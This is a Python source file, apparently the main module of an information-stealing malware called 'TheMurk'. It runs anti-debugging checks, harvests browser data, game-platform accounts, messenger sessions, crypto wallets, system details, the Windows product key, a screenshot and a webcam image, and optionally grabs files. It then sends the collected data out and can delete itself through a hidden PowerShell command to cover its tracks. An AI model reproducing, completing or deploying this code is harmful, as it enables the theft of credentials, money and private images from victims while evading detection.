from preferences.config import config
from manager.antiDebug import AntiDebug
from manager.folders import Folders
from targets.files.files import TxtFiles
from targets.files.file_grabber import Grab
from targets.browsers.chromium import Chromium
from targets.browsers.geckodriver import GeckoDriver
from targets.games.steam import Steam
from targets.games.epicgames import Epic
from targets.games.uplay import Ubisoft
from targets.games.battlenet import BattleNet
from targets.games.minecraft import Minecraft
from targets.messengers.discord import Discord
from targets.messengers.telegram import Telegram
from targets.messengers.viber import Viber
from targets.messengers.pidgin import Pidgin
from targets.system.system_info import SystemInfo
from targets.system.productkey import ProductKey
from targets.system.photos import Screenshot, WebCam
from targets.wallets.wallets import Wallets
from manager.send import Send
from sys import exit,argv
from win32com.client import Dispatch
from os.path import abspath



class TheMurk:
    def __init__(self) -> None:
        self.msgInfo = ["",""]#System, Other
        self.Progress()
    
    def Progress(self):
        self.Start()
        self.Browsers()
        self.Games()
        self.Messagers()
        self.Wallets()
        self.System()
        self.GrabFiles()
        self.Conclusion()
        exit()

    def Start(self):
        if not config.debuging:
            AntiDebug(config.oneStart)
        Folders(config.enableFileGrabber)
    
    def GrabFiles(self):
        if config.enableFileGrabber:
            self.msgInfo[1] += Grab()
        else:
            TxtFiles()
    
    def Browsers(self):
        self.msgInfo[1] += Chromium()
        self.msgInfo[1] += GeckoDriver()


    def Games(self):
        self.msgInfo[1] += Steam()
        self.msgInfo[1] += Epic()
        self.msgInfo[1] += Ubisoft()
        self.msgInfo[1] += Minecraft()
        self.msgInfo[1] += BattleNet()
    
    def Messagers(self):
        self.msgInfo[1] += Discord()
        self.msgInfo[1] += Telegram()
        self.msgInfo[1] += Viber()
        self.msgInfo[1] += Pidgin()
    
    def Wallets(self):
        self.msgInfo[1] += Wallets()
    
    def System(self):
        self.msgInfo[0] = SystemInfo()#
        ProductKey()
        Screenshot()
        WebCam()
    
    def Conclusion(self):
        Send(config.sendData, self.msgInfo)
        
        if config.selfDestruct:
            script_path = abspath(argv[0])
            ps_shell = Dispatch("WScript.Shell")
            command = f"powershell.exe -Command \"Start-Sleep -Seconds 3; Remove-Item -Path '{script_path}' -Force\""
            ps_shell.Run(command, 0, False)
